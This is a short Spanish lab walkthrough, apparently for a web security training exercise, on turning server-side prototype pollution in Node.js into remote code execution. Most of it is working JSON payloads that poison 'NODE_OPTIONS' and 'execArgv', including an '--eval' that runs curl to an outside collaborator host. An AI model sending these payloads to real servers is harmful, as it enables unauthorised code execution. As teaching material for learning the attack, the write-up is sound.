---
title: "9 - Remote code execution via server-side prototype pollution"
---

# 9 - Remote code execution via server-side prototype pollution

La idea es que `Run Maintenance Jobs` es la tipica acción que corre procesos hijo en el contexto de nodejs del lado del servidor.

`NODE_OPTIONS` es una variable de entorno que se añade por defecto a los procesos hijos, por ejemplo si se ejecuta :

```json
{
  "__proto__": {
    "shell": "node",
    "NODE_OPTIONS": "--require /tmp/malware.js"
  }
}

```

```bash
child_process.exec('node someScript.js')
```

Entonces se ejecutará :

```bash
node --require /tmp/malware.js someScript.js
```


Primero

```json
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"uD3wbDDo8DTS8blpDI3AZyuPDBTuVrSW",
	"__proto__": {
	    "shell":"node",
	    "NODE_OPTIONS":"--inspect=gp9pkgqpl15c27dydigjw9lrgimca4es3.oastify.com\"\".oastify\"\".com"
	}
}
```

Segundo : 

```json
{
	"csrf":"fLITjmR49w7m80eJ4TWBeXCpr6lGWbtb",
	"sessionId":"uD3wbDDo8DTS8blpDI3AZyuPDBTuVrSW",
	"tasks":[
		"db-cleanup",
		"fs-cleanup"
	]
}
```

Recibimos una DNS en el collaborator.

Si en el servidor no se están especificando argumentos para los hijos como aquí:

```javascript
child_process.fork('worker.js', [], {
  execArgv: ['--inspect']
});
```

Entonces los intentará pillar de object y pondrá nuestro execArgv

```json
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```

```bash
child_process.fork('script.js');
```

```bash
node --eval=require('child_process').execSync('curl https://YOUR-ID.oastify.com') script.js
```
